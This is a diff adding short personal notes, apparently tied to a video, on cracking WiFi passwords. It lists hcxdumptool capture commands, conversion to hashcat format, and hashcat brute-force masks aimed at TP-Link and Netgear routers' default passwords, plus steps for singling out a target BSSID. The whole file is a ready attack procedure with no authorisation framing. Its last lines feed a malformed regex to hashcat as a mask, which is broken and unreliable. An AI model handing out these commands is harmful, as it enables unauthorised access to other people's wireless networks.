@@ -1,0 +1,80 @@
+https://www.youtube.com/watch?v=Usw0IlGbkC4
+
+```
+// COMMANDS //
+
+// stop services
+sudo systemctl stop NetworkManager.service &
+sudo systemctl stop wpa_supplicant.service
+
+// capture info , run tool for only a few minutes
+sudo hcxdumptool -i wlan0 -o dumpfile.pcapng --active_beacon --enable_status=15 
+
+// start services
+sudo systemctl start wpa_supplicant.service
+sudo systemctl start NetworkManager.service
+
+// create file for hashcat 
+hcxpcapngtool -o hash.hc22000 -E essidlist dumpfile.pcapng
+
+// crack file with wordlist (takes too long , move over to windows to use gpu)
+hashcat -m 22000 hash.hc22000 wordlist.txt
+```
+
+
+Windows:
+
+had to download drivers for nvdia
+
+https://www.nvidia.com/Download/index.aspx
+
+that didn't work let's get cuda
+
+https://docs.nvidia.com/cuda/cuda-installation-guide-microsoft-windows/index.html
+
+https://developer.nvidia.com/cuda-downloads?target_os=Windows&target_arch=x86_64&target_version=10&target_type=exe_local
+
+// crack for 8 digits 
+`hashcat.exe -m 22000 hash.hc22000 -a 3 ?d?d?d?d?d?d?d?d`
+
+// crack for minimum of 8 digits incrementing to 18 digits
+`hashcat.exe -m 22000 hash.hc22000 -a 3 --increment --increment-min 8 --increment-max 18 ?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d`
+
+```
+hashcat.exe -m 22000 hash1.hc22000 -a 3 --increment --increment-min 8 --increment-max 12 
+
+hashcat.exe -m 22000 hash1.hc22000 -a 3 ?l?l?l?l?l?l?l?l
+
+hashcat.exe -m 22000 hash1.hc22000 -a 3 -1 ?l?u?d ?1?1?1?1?1?1?1?1
+
+hashcat.exe -m 22000 hash1.hc22000 -a 3 --increment --increment-min 8 --increment-max 12 ?a?a?a?a?a?a?a?a?a?a?a?a
+```
+
+**isolate BSSID from list and make a file with just that one target**
+
+TPlink routers have 8-digit numeric password MAC 50-D4-F7-XX-XX-XX
+
+Netgear `-1 ?l -2 ?d ?1?1?1?1?1?1?1?1?1?1?1?2?2?2`
+
+get mac addresses to isolate BSSID `sudo hcxdumptool --do_rcascan -i wlan0`
+
+##### character sets for hashcat
+
+?l = abcdefghijklmnopqrstuvwxyz
+?u = ABCDEFGHIJKLMNOPQRSTUVWXYZ
+?d = 0123456789
+?h = 0123456789abcdef
+?H = 0123456789ABCDEF
+?s = «space»!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~
+?a = ?l?u?d?s
+?b = 0x00 - 0xff
+
+
+massive wifi hack in Israel `https://www.cyberark.com/resources/threat-research-blog/cracking-wifi-at-scale-with-one-simple-trick`
+
+`sudo hashcat -a 3 -w4 -m 22000 hash.hc22000 05?d?d?d?d?d?d?d?d -o pmkid_cracked.txt`
+
+// regular expression for password containing any letter,digit & special character 
+/[aA-zA]*[0-9]*[^\w\*]*/gm
+
+`sudo hashcat -a 3 -w4 -m 22000 hash.hc22000 /[aA-zA]*[0-9]*[^\w\*]*/gm -o pmkid_cracked.txt`
